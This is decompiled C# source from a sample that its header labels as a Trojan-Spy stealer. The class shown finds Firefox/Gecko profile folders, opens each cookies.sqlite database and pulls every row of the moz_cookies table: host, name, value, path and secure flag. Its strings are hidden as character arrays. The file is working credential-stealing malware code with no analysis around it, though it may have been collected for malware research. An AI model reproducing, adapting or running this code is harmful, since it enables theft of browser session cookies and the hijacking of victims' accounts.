// Decompiled with JetBrains decompiler
// Type: dnlibWResourcesWinResourcesUserk
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

public static class dnlibWResourcesWinResourcesUserk
{
  public static List<SystemCodeDomCodeRegionDirectiveQ> Export(
    IList<string> paths)
  {
    List<SystemCodeDomCodeRegionDirectiveQ> regionDirectiveQList = new List<SystemCodeDomCodeRegionDirectiveQ>();
    try
    {
      foreach (string baseDirectory in paths.Select<string, string>((Func<string, string>) (x => Environment.ExpandEnvironmentVariables(x))))
      {
        try
        {
          foreach (string path in SystemNetTimerThreadQueueC.FindPaths(baseDirectory, 2, 1, "cookies.sqlite"))
          {
            string fullName = new FileInfo(path).Directory.FullName;
            string str = path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) ? dnlibWResourcesWinResourcesUserk.GeckoRoamingName(fullName) : dnlibWResourcesWinResourcesUserk.GeckoLocalName(fullName);
            if (!string.IsNullOrEmpty(str))
            {
              SystemCodeDomCodeRegionDirectiveQ regionDirectiveQ = new SystemCodeDomCodeRegionDirectiveQ()
              {
                Id1 = str,
                Id2 = new DirectoryInfo(fullName).Name,
                Id6 = (IList<dnlibDotNetFieldSigs>) new List<dnlibDotNetFieldSigs>((IEnumerable<dnlibDotNetFieldSigs>) dnlibWResourcesWinResourcesUserk.EnumCook(fullName)),
                Id3 = (IList<SystemComponentModelCultureInfoConverterb>) new List<SystemComponentModelCultureInfoConverterb>(),
                Id4 = (IList<SystemNetSafeCloseIcmpHandlev>) new List<SystemNetSafeCloseIcmpHandlev>(),
                Id5 = (IList<SystemComponentModelDesignServiceCreatorCallbackY>) new List<SystemComponentModelDesignServiceCreatorCallbackY>()
              };
              if (!regionDirectiveQ.Id7())
                regionDirectiveQList.Add(regionDirectiveQ);
            }
          }
        }
        catch
        {
        }
      }
    }
    catch (Exception ex)
    {
    }
    return regionDirectiveQList;
  }

  private static List<dnlibDotNetFieldSigs> EnumCook(string profile)
  {
    List<dnlibDotNetFieldSigs> dnlibDotNetFieldSigsList = new List<dnlibDotNetFieldSigs>();
    try
    {
      string str = Path.Combine(profile, new string(new char[14]
      {
        'c',
        'o',
        'o',
        'k',
        'i',
        'e',
        's',
        '.',
        's',
        'q',
        'l',
        'i',
        't',
        'e'
      }));
      if (!File.Exists(str))
        return dnlibDotNetFieldSigsList;
      SystemComponentModelRunInstallerAttributeJ installerAttributeJ = new SystemComponentModelRunInstallerAttributeJ(str);
      installerAttributeJ.ReadContextTable(new string(new char[11]
      {
        'm',
        'o',
        'z',
        '_',
        'c',
        'o',
        'o',
        'k',
        'i',
        'e',
        's'
      }));
      for (int rowNum = 0; rowNum < installerAttributeJ.RowLength; ++rowNum)
      {
        dnlibDotNetFieldSigs dnlibDotNetFieldSigs = (dnlibDotNetFieldSigs) null;
        try
        {
          dnlibDotNetFieldSigs = new dnlibDotNetFieldSigs(installerAttributeJ.ReadContextValue(rowNum, 6).Trim())
          {
            Id1 = installerAttributeJ.ReadContextValue(rowNum, 4).Trim(),
            Id2 = installerAttributeJ.ReadContextValue(rowNum, 4).Trim()[0] == '.',
            Id3 = installerAttributeJ.ReadContextValue(rowNum, 5).Trim(),
            Id4 = installerAttributeJ.ReadContextValue(rowNum, 9)[0] == '1',
            Id6 = installerAttributeJ.ReadContextValue(rowNum, 2).Trim(),
            Id7 = installerAttributeJ.ReadContextValue(rowNum, 3)
          };
        }
        catch
        {
        }
        if (dnlibDotNetFieldSigs != null)
          dnlibDotNetFieldSigsList.Add(dnlibDotNetFieldSigs);
      }
    }
    catch
    {
    }
    return dnlibDotNetFieldSigsList;
  }

  public static string GeckoRoamingName(string profilesDirectory)
  {
    string str = string.Empty;
    try
    {
      profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[10]
      {
        '%',
        'a',
        'p',
        'p',
        'd',
        'a',
        't',
        'a',
        '%',
        '\\'
      })), string.Empty);
      string[] strArray = profilesDirectory.Split(new char[1]
      {
        '\\'
      }, StringSplitOptions.RemoveEmptyEntries);
      str = !(strArray[2] == new string(new char[8]
      {
        'P',
        'r',
        'o',
        'f',
        'i',
        'l',
        'e',
        's'
      })) ? strArray[0] : strArray[1];
    }
    catch
    {
    }
    return str;
  }

  public static string GeckoLocalName(string profilesDirectory)
  {
    string str = string.Empty;
    try
    {
      profilesDirectory = profilesDirectory.Replace(Environment.ExpandEnvironmentVariables(new string(new char[15]
      {
        '%',
        'l',
        'o',
        'c',
        'a',
        'l',
        'a',
        'p',
        'p',
        'd',
        'a',
        't',
        'a',
        '%',
        '\\'
      })), string.Empty);
      string[] strArray = profilesDirectory.Split(new char[1]
      {
        '\\'
      }, StringSplitOptions.RemoveEmptyEntries);
      str = !(strArray[2] == new string(new char[8]
      {
        'P',
        'r',
        'o',
        'f',
        'i',
        'l',
        'e',
        's'
      })) ? strArray[0] : strArray[1];
    }
    catch
    {
    }
    return str;
  }
}
